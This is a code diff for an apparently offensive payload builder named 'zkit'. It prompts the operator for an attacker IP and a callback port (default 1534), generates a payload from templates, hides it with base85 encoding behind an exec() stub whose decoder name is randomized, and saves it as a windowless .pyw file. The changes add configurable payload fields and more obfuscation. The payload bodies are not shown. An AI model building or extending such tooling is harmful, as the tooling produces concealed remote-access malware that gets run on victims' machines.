@@ -4,9 +4,12 @@ import random
 from base64 import b85encode as be
 import socket as s
 from core.lib.payload import PayloadGenerator
-path = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
+from datetime import datetime as dt
+path = '\\'.join(__file__.replace("/", '\\').split("\\")[:-3])
 
-DECODE_STUB = 'from base64 import b85decode\nvalue ="""{}"""''\nexec(b85decode(value))'
+DECODE_STUB = 'from base64 import b85decode as {b}\nvalue ="""{}"""''\nexec({b}(value))'
+ASK_FOR_ASKING_STRING = "Payload is asking for a(n) '{}'. And is required : "
+ASK_FOR_REPORT_STRING = "Passing \\| to payload as {}"
 
 
 def init():
@@ -16,8 +19,9 @@ def init():
 
                  ]
     for _path in pathslist:
-        os.popen("mkdir {}".format(_path)).close()
-    os.popen('echo > {}'.format(path + "\\Errors.log"))
+        os.popen("mkdir \"{}\"".format(_path)).close()
+    os.popen('echo. > {}'.format(path + "\\Errors.log"))
+
     if os.name == "nt":
         os.system("cls")
     else:
@@ -89,8 +93,8 @@ def list_builtin_payloads(payload_type):
 
 
 def crash_handler(exception: BaseException):
-    with open(os.path.dirname(__file__) + "\\Errors.log", "a") as f:
-        f.write("[{}] : {}\n".format(dt.now(), e))
+    with open(path + "\\Errors.log", "a") as f:
+        f.write("[{}] : {}\n".format(dt.now(), str(exception)))
     print("Sth went really wrong that we couldnt handle it\n"
           + "the exceptions value have saved to Errors.log\n"
           + "please report this on github to me."
@@ -128,8 +132,8 @@ def notify(status: str, message: str, ending="\n", flush=False):
             temp = all_stats[stat].split('|')
             first = col.GetColor(temp[0]) + temp[1] + reset
             break
-    print("{}{} {}".format(
-        '\r' if flush else '', first, message), end=ending)
+    print("{}".format(
+        '\r' if flush else '' + first + str(message)), end=ending)
 
 
 def ask_for(message: str, report: str, default=None, type=str, args=None):  # pylint: disable=W0622; # noqa
@@ -246,42 +250,58 @@ class Generate:
     def __init__(self, root: str):
         "generates payloads with given root, "
         self.root = root
+        self.pg = PayloadGenerator(self.root)
+        self.get_fields()
         self.get_info()
         self.get_payload()
-        self.payload = encrypt_it(self.payload)
+        self.payload = encrypt_it(self.payload, chr(random.randint(65, 122)))
         self.path = create_file(path + "\\Builded\\" + self.path + ".pyw")
         f = open_file(self.path)
         write_file(f, self.payload)
         notify('report', "Operaion Was Successful")
 
     def get_info(self):
-        self.host = ask_for("Whats you ip address, hostname" +
-                            "left it to empty to use your own hostname (automic) : ",
-                            "Using ip \\| as Host", default=['', s.gethostbyname],
-                            args=s.gethostname()
-                            )
-        self.port = ask_for("Whats An Open Port In Your Machine " +
-                            "Left It '-1' To Use Default Port (1534 Eclipse's "
-                            "default communicate port) : ", "Using \\| As Port",
-                            default=[-1, 1534], type=int,
-                            )
+        datas = []
+        for field in self.fields:
+            print(field)
+            if field.lower() in ('host', 'ip', 'hostname', 'domain', 'attacker_ip'):
+                data = ask_for("Whats you ip address, hostname" +
+                               "left it to empty to use your own hostname (automic) : ",
+                               "Passing \\| to payload as hostname", default=['', s.gethostname],
+                               )
+            # so you can name it porty and portport or THEPORT or other names that 'port' is in it and zkit understand it .
+            elif 'port' in field.lower():
+                data = ask_for("Whats An Open Port In Your Machine " +
+                               "Left It '-1' To Use Default Port (1534 Eclipse's "
+                               "default communicate port) : ", "Passing \\| to payload as port",
+                               default=[-1, 1534], type=int,
+                               )
+            else:
+                data = ask_for(ASK_FOR_ASKING_STRING.format(field),
+                               ASK_FOR_REPORT_STRING.format(field))
+            datas.append(data)
+        self.args = datas
+        print(self.args)
         self.path = ask_for("Whats the filename  " +
                             "for your zkit generated script : ",
                             "using \\|.pyw as your filename",
                             default=['', ''], type=str,
                             )
+        print(*self.args)
 
     def get_payload(self) -> str:
-        self.payload = PayloadGenerator(
-            self.root).generate(self.host, self.port)
+        self.payload = self.pg.generate(self.args)
+
+    def get_fields(self):
+        self.fields = self.pg.get_fields()
 
 
-def encrypt_it(payload) -> str:
+def encrypt_it(payload, b) -> str:
     notify("notify", "Encrypting Data Before Writing On File...", "")
     payload = be(payload.encode("UTF-8")).decode("UTF-8")
     notify("report",
            "Encrypting Data Before Writing On File...Done", "\n", True)
-    return DECODE_STUB.format(payload)
+    return DECODE_STUB.format(payload, b=b)
 
 
 def print_banner():
